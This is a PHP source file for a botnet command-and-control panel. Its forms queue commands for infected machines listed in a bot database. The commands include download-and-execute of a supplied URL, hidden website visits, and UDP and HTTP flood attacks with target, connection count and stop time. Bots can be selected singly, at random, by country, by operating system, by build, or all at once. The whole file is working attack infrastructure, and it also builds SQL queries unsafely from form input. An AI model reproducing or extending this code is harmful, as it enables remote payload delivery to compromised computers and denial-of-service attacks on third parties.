<?php
	//check if included in project
	if ( !defined ( 'vnLoader' ) ) header ( 'location: ../' );

	//variables	
	$getstep = $_POST['step'];

	if ( isset ( $getstep ) )
		{
		if ( $getstep == 1 )
			{
			$page .= step1($user['name']);
			}
		elseif ( $getstep == 2 )
			{
			$page .= step2();
			}
		elseif ( $getstep == 3 )
			{
			$page .= step3($user['name']);
			}
		}
	else
		{
		$page .= step1($user['name']);
		}

	function step1($usr)
		{
		//include
		include ( './include/function.php' ) ;

		//STEP 1
		$page .= '				<form action="index.php?pid=3" method="post">' . "\n";
		$page .= '					<table style="text-align: left; margin: auto; font-family: Verdana; font-size: 13px;">' . "\n";
		$page .= '						<tr>' . "\n";
		$page .= '							<td>' . "\n";
		$page .= '								Run Command:' . "\n";
		$page .= '							</td>' . "\n";
		$page .= '							<td>' . "\n";
		$page .= '								<select name="cmd" size="1">' . "\n";
		$page .= '									<optgroup label="Server Tools">' . "\n";
		if ( instring( '1' , $permission) ) 
			{
			$page .= '										<option value="1">Download & Execute</option>' . "\n";
			}
		if ( instring( '2' , $permission ) ) 
			{
			$page .= '										<option value="2">Update</option>' . "\n";
			}
		if ( instring( '3' , $permission ) ) 
			{
			$page .= '										<option value="3">Remove</option>' . "\n";
			}
		$page .= '									</optgroup>' . "\n";
		$page .= '									<optgroup label="Net Tools">' . "\n";
		if ( instring( '4' , $permission ) ) 
			{
			$page .= '										<option value="4">Browse Website (Visible)</option>' . "\n";
			}
		if ( instring( '5' , $permission ) ) 
			{
			$page .= '										<option value="5">Visit Website (Hidden)</option>' . "\n";
			}
		$page .= '									</optgroup>' . "\n";
		$page .= '									<optgroup label="DDoS Tools">' . "\n";
		if ( instring( '8' , $permission ) ) 
			{
			$page .= '										<option value="8">UDP-Flood</option>' . "\n";
			}
		if ( instring( '9' , $permission ) ) 
			{
			$page .= '										<option value="9">HTTP-Flood</option>' . "\n";
			}
		$page .= '									</optgroup>' . "\n";
		$page .= '								</select>' . "\n";
		$page .= '							</td>' . "\n";
		$page .= '						</tr>' . "\n";
		$page .= '						<tr><td>&nbsp;</td><td></td></tr>' . "\n";
		$page .= '						<tr>' . "\n";
		$page .= '							<td>' . "\n";
		$page .= '								Select Bots:' . "\n";
		$page .= '							</td>' . "\n";
		$page .= '							<td>' . "\n";
		$page .= '								<input type="radio" name="selectbots" value="2" checked>Single</input><br />' . "\n";
		$page .= '								<input type="radio" name="selectbots" value="0">Random</input><br />' . "\n";
		$page .= '								<input type="radio" name="selectbots" value="4">Location</input><br />' . "\n";
		$page .= '								<input type="radio" name="selectbots" value="6">Build</input><br />' . "\n";
		$page .= '								<input type="radio" name="selectbots" value="5">Operating System</input><br />' . "\n";
		$page .= '								<input type="radio" name="selectbots" value="3">All (+on connecting)</input>' . "\n";
		$page .= '							</td>' . "\n";
		$page .= '						</tr>' . "\n";
		$page .= '					</table>' . "\n";
		$page .= '					<br />' . "\n";
		$page .= '					<input type="hidden" name="step" value="2" />' . "\n";
		$page .= '					<input type="submit" value="Next >" />' . "\n";
		$page .= '				</form>' . "\n";
		return $page;
		}

	function step2()
		{
		//STEP 2
		$cmd = $_POST['cmd'];
		$selectbots = $_POST['selectbots'];
		$command = array('Download & Execute' , 'Update' , 'Remove' , 'Browse Website (Visible)' , 'Visit Website (Hidden)' , 'MSN-Spread' , 'XFire-Spread' , 'UDP-Flood' , 'HTTP-Flood');

		$page .= '				<div class="font">' . $command[$cmd - 1] . '</div><br />' . "\n";
		$page .= '				<form action="index.php?pid=3" method="post">' . "\n";
		$page .= '					<table style="text-align: left; margin: auto; font-family: Verdana; font-size: 13px;">' . "\n";

		if ( $cmd == 1 || $cmd == 2 || $cmd == 4 || $cmd == 5 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>URL:</td>' . "\n";
			$page .= '							<td><input type="text" name="param1" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 6 || $cmd == 7 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Text:</td>' . "\n";
			$page .= '							<td><input type="text" name="param1" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 2 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Password:</td>' . "\n";
			$page .= '							<td><input type="password" name="param2" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 3 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Password:</td>' . "\n";
			$page .= '							<td><input type="password" name="param1" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 8 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>IP:</td>' . "\n";
			$page .= '							<td><input type="text" name="param1" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 9 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>DNS:</td>' . "\n";
			$page .= '							<td><input type="text" name="param1" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 9 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Connections:</td>' . "\n";
			$page .= '							<td><input type="text" name="param5" size="40" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 9 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Page:</td>' . "\n";
			$page .= '							<td><input type="text" name="param6" size="40" value="/" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 8 || $cmd == 9 )
			{
			$page .= '						<tr><td>&#160;</td><td></td></tr>' . "\n";
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Stop Date (GMT):</td>' . "\n";
			$page .= '							<td><input type="text" name="param3" size="40" value="' . gmdate("d.m.Y") . '" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		if ( $cmd == 8 || $cmd == 9 )
			{
			$page .= '						<tr>' . "\n";
			$page .= '							<td>Stop Time (GMT):</td>' . "\n";
			$page .= '							<td><input type="text" name="param4" size="40" value="HH:MM:SS" /></td>' . "\n";
			$page .= '						</tr>' . "\n";
			}
		$page .= '					</table>' . "\n";
		$page .= '					<br />' . "\n";

		if ( $selectbots == 0 )
			{
			//Random Bots
			$page .= '					Amount: <input type="text" name="amount" size="5" /><br />' . "\n";
			}
		elseif ( $selectbots == 2 )
			{
			//Single Bot
			$page .= '					Bot-ID: <input type="text" name="botid" size="13" /><br />' . "\n";
			}
		elseif ( $selectbots == 3 )
			{
			//Every
			$page .= '					Every Bot selected!<input type="hidden" name="every" value="*" /><br />' . "\n";
			}
		elseif ( $selectbots == 4 )
			{
			//Location
			$page .= '					Locations:<br />' . "\n";
			$page .= '					<select name="locations[]" size="5" style="width: 25%" multiple>' . "\n";

			$result = mysql_query("SELECT COUNTRY FROM botlist GROUP BY COUNTRY");
			while($rows = mysql_fetch_array($result))
				{
				$page .= '						<option value="' . $rows[0] . '">' . $rows[0] . '</option>' . "\n";				
				}

			$page .= '					</select><br /><br />' . "\n";
			$page .= '					Limit: <input type="text" name="locationlimit" size="5" /><br />' . "\n";
			$page .= '					<font color="#1b84ec">Leave blank for no Limit.</font><br />' . "\n";

			}
		elseif ( $selectbots == 5 )
			{
			//Operating System
			$page .= '					Operating Systems:<br />' . "\n";
			$page .= '					<select name="operatingsystems[]" size="5" style="width: 25%" multiple>' . "\n";

			$result = mysql_query("SELECT OS FROM botlist GROUP BY OS;");
			while($rows = mysql_fetch_array($result))
				{
				$page .= '						<option value="' . $rows[0] . '">' . $rows[0] . '</option>' . "\n";				
				}

			$page .= '					</select><br /><br />' . "\n";
			$page .= '					Limit: <input type="text" name="oslimit" size="5" /><br />' . "\n";
			$page .= '					<font color="#1b84ec">Leave blank for no Limit.</font><br />' . "\n";
			
			}
		elseif ( $selectbots == 6 )
			{
			//Build
			$page .= '					Build:<br />' . "\n";
			$page .= '					<select name="build[]" size="5" style="width: 25%" multiple>' . "\n";

			$result = mysql_query("SELECT VERSION FROM botlist GROUP BY VERSION;");
			while($rows = mysql_fetch_array($result))
				{
				$page .= '						<option value="' . $rows[0] . '">' . $rows[0] . '</option>' . "\n";				
				}

			$page .= '					</select><br /><br />' . "\n";
			$page .= '					Limit: <input type="text" name="bulimit" size="5" /><br />' . "\n";
			$page .= '					<font color="#1b84ec">Leave blank for no Limit.</font><br />' . "\n";
			
			}
		$page .= '					<br />' . "\n";
		$page .= '					<input type="hidden" name="step" value="3" />' . "\n";
		$page .= '					<input type="hidden" name="selectbots" value="' . $selectbots . '" />' . "\n";
		$page .= '					<input type="hidden" name="cmd" value="' . $cmd . '" />' . "\n";
		$page .= '					<input type="submit" value="Run Command >" />' . "\n";
		$page .= '				</form>' . "\n";
		
		return $page;
		}

	function step3($usr)
		{
		//count total bots
		$result = mysql_query("SELECT COUNT(*) FROM botlist WHERE 1");
		$row = mysql_fetch_array($result);
		$totalbots = (int)$row[0];

		$cmd = $_POST['cmd'];
		$selectbots = $_POST['selectbots'];
		$param1 = trim ( $_POST['param1'] );
		$param2 = trim ( $_POST['param2'] );
		$param3 = trim ( $_POST['param3'] );
		$param4 = trim ( $_POST['param4'] );
		$param5 = trim ( $_POST['param5'] );
		$param6 = trim ( $_POST['param6'] );

		
		if ( $cmd == 8 )
			{
			$param = trim( $param1 ) . "|" . trim( $param3 ) . " " . trim( $param4 );
			}
		elseif ( $cmd == 9 )
			{
			$param = trim( $param1 ) . "|" . trim( $param3 ) . " " . trim( $param4 ) . "|" . trim( $param5 ) . "|" . trim( $param6 );
			}
		else
			{
			if ( $param2 != '' )
				{
				$param = trim( $param1 ) . "|" . trim( $param2 );
				}
			else
				{
				$param = trim( $param1 );
				}
			}

		if ( $cmd != '' & $param != '' )
			{
			if ( $selectbots == 0 )
				{
				//Random Bots
				$amount = trim ( $_POST['amount'] );
				$bots = random($amount , $totalbots);

				if ( $amount != '' )
					{
					mysql_query ("INSERT INTO commands (cmd , param , bots , user) VALUES ('" . $cmd . "' , '" . $param . "' , '" . $bots . "' , '" . $usr . "')");
					$page .= '				Command has sent successfully.<br />' . "\n";
					}
				else
					{
					$page .= '				An error has occurred. Unable to send the command.<br />' . "\n";
					}
				}
			elseif ( $selectbots == 2 )
				{
				//Single Bot
				$bots = trim ( $_POST['botid'] );

				if ( $bots != '' )
					{
				mysql_query ("INSERT INTO commands (cmd , param , bots , user) VALUES ('" . $cmd . "' , '" . $param . "' , '" . $bots . "' , '" . $usr . "')");
				$page .= '				Command has sent successfully.<br />' . "\n";
					}
				else
					{
					$page .= '				An error has occurred. Unable to send the command.<br />' . "\n";
					}
				}
			elseif ( $selectbots == 3 )
				{
				//Every
				$bots = '*';

				mysql_query ("INSERT INTO commands (cmd , param , bots , user) VALUES ('" . $cmd . "' , '" . $param . "' , '" . $bots . "' , '" . $usr . "')");
				$page .= '				Command has sent successfully.<br />' . "\n";
				}
			elseif ( $selectbots == 4 )
				{
				//Location
				$loc = $_POST['locations'];
				$sql = "SELECT ID from botlist WHERE ";
				for ($i = 0; $i <= sizeof($_POST['locations']) - 1; $i++) 
					{
					$sql .= "Country = '" . $loc[$i] . "' OR ";
					}
				$sql .= "0 ORDER BY rand()";

				if ( trim( $_POST['locationlimit'] ) != "" )
					{
					$sql .= " LIMIT " . trim( $_POST['locationlimit'] );
					}

				$result = mysql_query($sql);
				while ($rows = mysql_fetch_array($result))
					{
					$bots .= $rows[0] . "_";
					}

				mysql_query ("INSERT INTO commands (cmd , param , bots , user) VALUES ('" . $cmd . "' , '" . $param . "' , '" . $bots . "' , '" . $usr . "')");
				$page .= '				Command has sent successfully.<br />' . "\n";
				}
			elseif ( $selectbots == 5 )
				{
				//Operating System
				$loc = $_POST['operatingsystems'];
				$sql = "SELECT ID from botlist WHERE ";
				for ($i = 0; $i <= sizeof($_POST['operatingsystems']) - 1; $i++) 
					{
					$sql .= "OS = '" . $loc[$i] . "' OR ";
					}
				$sql .= "0 ORDER BY rand()";

				if ( trim( $_POST['oslimit'] ) != "" )
					{
					$sql .= " LIMIT " . trim( $_POST['oslimit'] );
					}

				$result = mysql_query($sql);
				while ($rows = mysql_fetch_array($result))
					{
					$bots .= $rows[0] . "_";
					}

				mysql_query ("INSERT INTO commands (cmd , param , bots , user) VALUES ('" . $cmd . "' , '" . $param . "' , '" . $bots . "' , '" . $usr . "')");
				$page .= '				Command has sent successfully.<br />' . "\n";
				}
			elseif ( $selectbots == 6 )
				{
				//Operating System
				$loc = $_POST['build'];
				$sql = "SELECT ID from botlist WHERE ";
				for ($i = 0; $i <= sizeof($_POST['build']) - 1; $i++) 
					{
					$sql .= "VERSION = '" . $loc[$i] . "' OR ";
					}
				$sql .= "0 ORDER BY rand()";

				if ( trim( $_POST['bulimit'] ) != "" )
					{
					$sql .= " LIMIT " . trim( $_POST['bulimit'] );
					}

				$result = mysql_query($sql);
				while ($rows = mysql_fetch_array($result))
					{
					$bots .= $rows[0] . "_";
					}

				mysql_query ("INSERT INTO commands (cmd , param , bots , user) VALUES ('" . $cmd . "' , '" . $param . "' , '" . $bots . "' , '" . $usr . "')");
				$page .= '				Command has sent successfully.<br />' . "\n";
				}
			else
				{
				$page .= '				An error has occurred. Unable to send the command.<br />' . "\n";
				}
			}
		else 
			{
			$page .= '				An error has occurred. Unable to send the command.<br />' . "\n";
			}

		return $page;
		}



	function getidbycount($count)
		{
		$result = mysql_query("SELECT ID FROM botlist WHERE tableid = '" . $count . "'");
		$rows = mysql_fetch_array($result);
		return $rows['ID'];
		}

	function random($anzahl, $bis)
		{
		if ( $anzahl > $bis )
			{
			$anzahl = $bis;
			}
		$arr = range(1, $bis);
		shuffle($arr);
		for($i = 0; $i != $anzahl; $i++)
		$ret .= getidbycount($arr[$i]) . "_";
		return $ret;
		}

	function inStr ($needle, $haystack)
		{
		$needlechars = strlen($needle);
		$i = 0;
		for($i=0; $i < strlen($haystack); $i++)
			{
			if(substr($haystack, $i, $needlechars) == $needle)
				{
			       return TRUE;
				}
			}
		return FALSE;
		}
?>